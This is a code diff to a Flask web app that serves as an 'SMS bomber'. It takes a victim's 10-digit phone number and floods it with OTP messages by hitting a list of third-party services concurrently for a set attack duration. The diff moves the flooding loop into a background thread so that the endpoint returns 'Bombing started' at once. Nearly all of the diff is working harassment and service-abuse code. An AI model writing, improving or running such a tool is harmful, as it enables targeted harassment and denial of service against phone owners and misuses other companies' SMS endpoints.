@@ -14,6 +14,7 @@ url_prefix="/script10".
 # Imports
 # ----------------------------------------------------------------------
 import time
+import threading
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -84,6 +85,29 @@ def _build_payload(template, number):
     }
 
 # ----------------------------------------------------------------------
+# Background worker that actually performs the bombing
+# ----------------------------------------------------------------------
+def bomb_worker(number: str):
+    """Run the bombing loop in a separate thread."""
+    results = []
+    start = time.time()
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        futures = []
+        while time.time() - start < TOTAL_ATTACK_DURATION:
+            for svc in SERVICES:
+                payload = _build_payload(svc["payload_template"], number)
+                futures.append(executor.submit(_send_otp, svc, payload))
+            # Sleep inside the worker thread – the HTTP request is already finished
+            time.sleep(DELAY_BETWEEN_REQUESTS)
+
+        for fut in as_completed(futures):
+            results.append(fut.result())
+
+    # Persist or log the results somewhere if you need them
+    # For this demo we simply drop them – the API already returned earlier
+    return results
+
+# ----------------------------------------------------------------------
 # Routes
 # ----------------------------------------------------------------------
 @sms_bomber_bp.route("/", methods=["GET"])
@@ -137,7 +161,7 @@ def index():
 
 @sms_bomber_bp.route("/bomb", methods=["POST"])
 def bomb():
-    """Trigger concurrent SMS bombing."""
+    """Trigger concurrent SMS bombing – runs in background to avoid worker timeout."""
     try:
         # Accept form data or JSON
         if request.is_json:
@@ -151,36 +175,26 @@ def bomb():
         if not (number.isdigit() and len(number) == 10):
             return jsonify({"error": "Invalid phone number – must be 10 digits."}), 400
 
-        results = []
-        start = time.time()
+        # Start the worker thread – it will do the heavy lifting
+        thread = threading.Thread(
+            target=bomb_worker, args=(number,), daemon=True
+        )
+        thread.start()
 
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-            futures = []
-            # Run until the total duration is reached
-            while time.time() - start < TOTAL_ATTACK_DURATION:
-                for svc in SERVICES:
-                    payload = _build_payload(svc["payload_template"], number)
-                    futures.append(executor.submit(_send_otp, svc, payload))
-                time.sleep(DELAY_BETWEEN_REQUESTS)
-
-            # Gather results
-            for fut in as_completed(futures):
-                results.append(fut.result())
-
+        # Return immediately – the bombing is running in the background
         return jsonify(
             {
-                "status": "Bombing complete",
+                "status": "Bombing started",
                 "target": number,
-                "duration_sec": int(time.time() - start),
-                "responses": results,
+                "duration_sec": TOTAL_ATTACK_DURATION,
+                "info": "Bombing runs in a background thread; check logs for results.",
             }
         )
 
     except Exception as exc:
-        # Return a generic error; logging can be added here
         return jsonify({"error": f"Unexpected error: {exc}"}), 500
 
 # ----------------------------------------------------------------------
 # Compatibility alias – used by app.py
 # ----------------------------------------------------------------------
-script10_bp = sms_bomber_bp   # <-- Fixed: remove trailing dot
+script10_bp = sms_bomber_bp   # <-- Fixed: no trailing dot
